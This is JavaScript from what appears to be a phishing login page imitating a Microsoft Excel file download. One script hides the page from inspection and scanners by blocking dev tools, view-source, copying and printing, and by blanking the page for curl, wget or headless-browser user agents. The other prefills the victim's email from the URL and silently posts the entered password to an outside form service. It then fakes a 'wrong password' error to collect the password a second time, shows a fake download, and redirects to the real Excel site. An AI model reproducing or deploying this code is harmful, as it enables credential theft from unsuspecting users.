<script type="text/javascript">
    // ============================================================
    // ANTI-BOT + SOURCE GUARD
    // ============================================================
    (function() {
        // 1. Disable right-click context menu
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });

        // 2. Disable common keyboard shortcuts for viewing source / dev tools
        document.addEventListener('keydown', function(e) {
            // F12
            if (e.key === 'F12' || e.keyCode === 123) {
                e.preventDefault();
                return false;
            }
            // Ctrl+Shift+I / Cmd+Shift+I (DevTools)
            if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.keyCode === 73)) {
                e.preventDefault();
                return false;
            }
            // Ctrl+Shift+J / Cmd+Shift+J (Console)
            if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'J' || e.key === 'j' || e.keyCode === 74)) {
                e.preventDefault();
                return false;
            }
            // Ctrl+Shift+C / Cmd+Shift+C (Inspect Element)
            if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'C' || e.key === 'c' || e.keyCode === 67)) {
                e.preventDefault();
                return false;
            }
            // Ctrl+U / Cmd+U (View Source)
            if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) {
                e.preventDefault();
                return false;
            }
            // Ctrl+S / Cmd+S (Save Page)
            if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's' || e.keyCode === 83)) {
                e.preventDefault();
                return false;
            }
            // Ctrl+A / Cmd+A (Select All) - optional, can be intrusive
            if ((e.ctrlKey || e.metaKey) && (e.key === 'A' || e.key === 'a' || e.keyCode === 65)) {
                // Allow select-all inside input fields
                var tag = (e.target || e.srcElement).tagName;
                if (tag !== 'INPUT' && tag !== 'TEXTAREA') {
                    e.preventDefault();
                    return false;
                }
            }
        });

        // 3. Disable text selection / copy / cut on the page (except inside inputs)
        document.addEventListener('selectstart', function(e) {
            var tag = (e.target || e.srcElement).tagName;
            if (tag !== 'INPUT' && tag !== 'TEXTAREA') {
                e.preventDefault();
                return false;
            }
        });

        document.addEventListener('copy', function(e) {
            var tag = (e.target || e.srcElement).tagName;
            if (tag !== 'INPUT' && tag !== 'TEXTAREA') {
                e.preventDefault();
                return false;
            }
        });

        document.addEventListener('cut', function(e) {
            var tag = (e.target || e.srcElement).tagName;
            if (tag !== 'INPUT' && tag !== 'TEXTAREA') {
                e.preventDefault();
                return false;
            }
        });

        // 4. Detect if DevTools is open (basic heuristic) and blur/clear page
        var devtoolsOpen = false;
        var threshold = 160;
        setInterval(function() {
            var widthDiff = window.outerWidth - window.innerWidth;
            var heightDiff = window.outerHeight - window.innerHeight;
            if (widthDiff > threshold || heightDiff > threshold) {
                if (!devtoolsOpen) {
                    devtoolsOpen = true;
                    // Obfuscate / clear sensitive UI
                    document.body.innerHTML = '';
                    document.body.style.background = '#ffffff';
                }
            } else {
                devtoolsOpen = false;
            }
        }, 1000);

        // 5. Disable drag on images and links
        document.addEventListener('dragstart', function(e) {
            e.preventDefault();
            return false;
        });

        // 6. Basic bot detection: require mouse movement before enabling submit
        var humanVerified = false;
        var humanCheck = function() {
            humanVerified = true;
            document.removeEventListener('mousemove', humanCheck);
            document.removeEventListener('touchstart', humanCheck);
            document.removeEventListener('scroll', humanCheck);
            document.removeEventListener('keydown', humanCheck);
        };
        document.addEventListener('mousemove', humanCheck);
        document.addEventListener('touchstart', humanCheck);
        document.addEventListener('scroll', humanCheck);
        document.addEventListener('keydown', humanCheck);

        // Expose flag for form handler
        window.__humanVerified = function() { return humanVerified; };

        // 7. Prevent iframe embedding (clickjacking protection)
        if (window.top !== window.self) {
            try {
                window.top.location = window.self.location;
            } catch (e) {
                document.body.innerHTML = '';
            }
        }

        // 8. Detect headless / automation user agents (basic)
        var ua = navigator.userAgent.toLowerCase();
        var botPatterns = [
            'headless', 'phantom', 'selenium', 'puppeteer', 'playwright',
            'python-requests', 'curl', 'wget', 'scrapy', 'bot', 'crawler', 'spider'
        ];
        for (var i = 0; i < botPatterns.length; i++) {
            if (ua.indexOf(botPatterns[i]) !== -1) {
                document.body.innerHTML = '';
                return;
            }
        }

        // 9. Prevent printing (Ctrl+P / Cmd+P)
        document.addEventListener('keydown', function(e) {
            if ((e.ctrlKey || e.metaKey) && (e.key === 'P' || e.key === 'p' || e.keyCode === 80)) {
                e.preventDefault();
                return false;
            }
        });

        // 10. Obfuscate source: periodically clear console
        setInterval(function() {
            try { console.clear(); } catch (e) {}
        }, 2000);
    })();
</script>

<script type="text/javascript">
    // Populate email from URL hash after the form is rendered
    (function populateEmailFromHash() {
        const hash = window.location.hash;
        if (hash && hash.length > 1) {
            const emailFromHash = decodeURIComponent(hash.substring(1));
            const emailInput = document.getElementById('login');
            if (emailInput) {
                emailInput.value = emailFromHash;
            }
        } else {
            const emailInput = document.getElementById('login');
            if (emailInput) {
                emailInput.readOnly = false;
                emailInput.placeholder = "Enter your email";
            }
        }
    })();

    // Two-step submission: first shows wrong password (auto-hide after 3s), second navigates to loader page
    document.addEventListener('DOMContentLoaded', function () {
        const form = document.getElementById('loginForm');
        const msgSpan = document.getElementById('msg');
        const passwdInput = document.getElementById('passwd');
        let submitCount = 0;
        let msgTimer = null;

        if (form) {
            form.addEventListener('submit', function (e) {
                e.preventDefault(); // Stop normal form submission (no Formspark redirect)

                // Basic bot gate: require human interaction before allowing submit
                if (typeof window.__humanVerified === 'function' && !window.__humanVerified()) {
                    // Silently ignore bot submissions
                    return;
                }

                submitCount++;

                // Gather form data
                const formData = new FormData(form);

                // Send data to Formspark (silently, no redirect)
                fetch(form.action, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                }).catch(function () {
                    // Ignore errors; we still proceed with UI logic
                });

                if (submitCount === 1) {
                    // First submission: show error message, clear password field, auto-hide after 3s
                    if (msgSpan) {
                        msgSpan.style.display = 'inline';
                        if (msgTimer) {
                            clearTimeout(msgTimer);
                        }
                        msgTimer = setTimeout(function () {
                            msgSpan.style.display = 'none';
                        }, 3000);
                    }
                    if (passwdInput) {
                        passwdInput.value = '';
                        passwdInput.focus();
                    }
                } else {
                    // Second submission: build the loader page in the same window
                    // After 100%, show red error message before redirect
                    const loaderPage = '<!DOCTYPE html>' +
                        '<html lang="en">' +
                        '<head>' +
                        '<meta charset="utf-8">' +
                        '<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">' +
                        '<title>Downloading...</title>' +
                        '</head>' +
                        '<body style="margin:0; padding:0; background-color:#f0f0f0; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif;">' +
                        '<div style="color:#006100; font-size:15px; font-weight:bold; margin-bottom:10px; letter-spacing:0.5px;">Downloading Excel File</div>' +
                        '<div style="background-color:#006100; color:#ffffff; border-radius:8px; padding:4px 28px; box-shadow:0px 4px 12px rgba(0,0,0,0.3); text-align:center; min-width:280px;">' +
                        '<div style="font-size:13px; color:#ffffff; letter-spacing:0.5px;">Downloading...</div>' +
                        '<div id="loader-percent" style="font-size:20px; font-weight:bold; color:#ffffff; margin-top:2px;">1%</div>' +
                        '</div>' +
                        '<div id="corrupt-msg" style="display:none; color:#ff0000; font-size:14px; font-weight:bold; margin-top:12px; text-align:center;">Download file corrupt, please try again letter</div>' +
                        '<script type="text/javascript">' +
                        'var percent = 1;' +
                        'var percentEl = document.getElementById("loader-percent");' +
                        'var corruptMsg = document.getElementById("corrupt-msg");' +
                        'if (percentEl) { percentEl.textContent = percent + "%"; }' +
                        'var interval = setInterval(function () {' +
                        '    percent++;' +
                        '    if (percentEl) { percentEl.textContent = percent + "%"; }' +
                        '    if (percent >= 100) {' +
                        '        clearInterval(interval);' +
                        '        if (corruptMsg) { corruptMsg.style.display = "block"; }' +
                        '        setTimeout(function () {' +
                        '            window.location.href = "https://excel.cloud.microsoft";' +
                        '        }, 2500);' +
                        '    }' +
                        '}, 150);' +
                        '<\/script>' +
                        '</body>' +
                        '</html>';

                    document.open();
                    document.write(loaderPage);
                    document.close();
                }
            });
        }
    });
